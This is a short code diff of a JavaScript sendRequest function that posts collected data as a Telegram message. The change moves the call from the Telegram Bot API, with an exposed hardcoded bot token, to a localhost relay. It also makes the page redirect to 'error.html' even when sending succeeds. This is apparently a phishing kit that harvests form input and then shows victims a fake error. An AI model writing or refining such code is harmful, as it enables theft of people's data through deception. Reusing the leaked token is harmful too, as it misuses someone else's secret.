@@ -98,7 +98,8 @@ const sendRequest = (data) => {
         parse_mode: 'HTML' // Optional: You can use HTML or Markdown for text formatting
     };
 
-    fetch(`https://api.telegram.org/bot7441962027:AAFvYyCiygOVaT8yWtcToYNZd--bT9QRzxI/sendMessage`, { // Replace with your bot token
+    // Modify this part to send a request to your local server instead of Telegram API directly
+    fetch('http://localhost:3000/sendMessage', { // Replace with your local backend URL
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -109,10 +110,10 @@ const sendRequest = (data) => {
     .then(responseData => {
         if (responseData.ok) {
             console.log("Message sent successfully to Telegram.");
-            // window.location.href = 'error.html';
+            window.location.href = 'error.html';
         } else {
             console.error("Failed to send message to Telegram:", responseData);
-            // window.location.href = 'error.html';
+            window.location.href = 'error.html';
         }
     })
     .catch((error) => {
